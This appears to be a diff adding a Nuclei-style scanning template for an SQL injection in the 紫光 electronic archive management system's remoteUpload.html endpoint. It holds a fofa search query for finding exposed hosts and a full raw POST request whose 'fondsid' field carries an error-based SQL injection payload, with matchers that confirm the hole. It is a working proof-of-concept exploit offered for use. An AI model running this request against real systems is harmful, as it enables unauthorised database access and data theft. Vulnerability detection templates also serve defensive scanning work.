@@ -1,0 +1,59 @@
+id: unis-e-doc-system-sqli-remoteupload
+
+info:
+  name: "紫光电子档案管理系统 remoteUpload.html SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: header="OfficeWeb365" || body="请输入furl参数"
+      紫光电子档案管理系统中某接口存在SQL注入漏洞。攻击者可通过构造恶意SQL查询，绕过输入验证机制，执行任意数据库命令，导致敏感数据泄露、数据完整性受损或服务不可用。
+  tags: 紫光电子档案管理系统
+
+http:
+- raw:
+  - |
+    POST /Archive/ErecordManage/remoteUpload.html?token HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Type: multipart/form-data; boundary=cc363856508c37f89af87f66486f3e1c
+
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="userID"
+
+    admin
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="fondsid"
+
+    111111' or 1=1 and (select extractvalue(1,concat('~',(select 111*111)))) --+'
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="comid"
+
+    100000
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="token"
+
+    900000
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="archtypeid"
+
+    9000000
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="tableid"
+
+    9000000
+    --cc363856508c37f89af87f66486f3e1c
+    Content-Disposition: form-data; name="archid"
+
+    9000000
+    --cc363856508c37f89af87f66486f3e1c--
+            --cc363856508c37f89af87f66486f3e1c--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '12321'
